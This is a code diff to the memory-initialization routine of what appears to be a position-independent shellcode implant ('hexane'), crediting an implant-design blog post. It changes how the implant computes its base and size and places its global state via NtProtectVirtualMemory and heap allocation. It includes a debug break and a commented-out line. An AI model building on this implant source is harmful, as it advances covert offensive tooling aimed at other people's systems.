@@ -48,8 +48,6 @@ namespace Memory {
 
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
             _hexane instance = { };
-            void *global     = { };
-
 			SIZE_T size   = sizeof(void*);
 			ULONG protect = 0;
 
@@ -58,7 +56,7 @@ namespace Memory {
 
             instance.teb->LastErrorValue    = ERROR_SUCCESS;
             instance.base.address           = U_PTR(InstStart());
-            instance.base.size              = U_PTR(InstStart()) - instance.base.address;
+            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
             if (!(instance.modules.ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase)) {
                 return false;
@@ -71,16 +69,18 @@ namespace Memory {
                 return false;
             }
 
-            global = (LPVOID) GLOBAL_OFFSET;
+			__debugbreak();
+            void *global = (LPVOID) instance.base.address + U_PTR(&__global);
+			void *glob_a = global;
 
-			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &global, &size, PAGE_READWRITE, &protect)) ||
+			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &glob_a, &size, PAGE_READWRITE, &protect)) ||
 				!(C_DREF(global) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return false;
             }
 
             MemCopy(C_DREF(global), &instance, sizeof(_hexane));
             MemSet(&instance, 0, sizeof(_hexane));
-            MemSet((PBYTE) global + sizeof(LPVOID), 0, 0xe);
+            //MemSet(global + sizeof(LPVOID), 0, 0xe);
 
             return true;
         }
